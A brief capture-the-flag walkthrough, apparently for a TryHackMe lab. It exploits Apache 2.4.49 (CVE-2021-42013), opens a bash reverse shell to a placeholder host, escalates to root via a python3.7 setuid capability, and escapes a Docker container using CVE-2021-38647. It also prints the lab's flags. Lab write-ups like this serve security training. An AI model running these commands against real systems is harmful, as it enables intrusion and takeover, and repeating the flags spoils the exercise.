Start from nmapscan
```shell
Nmap scan report for 10.10.21.51
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (95%), Crestron 2-Series (86%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5 cpe:/o:crestron:2_series
Aggressive OS guesses: Linux 4.15 (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (88%), Linux 2.6.32 - 3.5 (86%), Crestron XPanel control system (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   123.65 ms 10.11.0.1
2   123.79 ms 10.10.21.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3574.58 seconds
```
find apache version and this version has got CVE-2021-42013 - RCE on apache, use exploit and take first shell, we must stabilization this, use 
```shell
bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
```
for Reverse shell, after use:
```shell
stty raw -echo; fg
```
after push `Enter` and we have our good shell
next stem get a user flag 
i find root from capabilites
```shell
/usr/bin/python3.7 = cap_setuid+ep
```
use
```shell
python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
and we take `uid=0(root)`
we have a root what strange but, okay take user flag
```shell
cat /root/user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```
after i dont kniw what to do next and i thin what if im in docker and i find
```shell
root@4a70924bafa0:/root# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) RX packets 966 bytes 65304 (63.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 602 bytes 106152 (103.6 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
```
and we see what we in container, after find open port in main machine its `5986`
and we have RCE for this port because its open, use exploit for this CVE-2021-38647
and take a flag:
```shell
THM{7f147ef1f36da9ae29529890a1b6011f}
```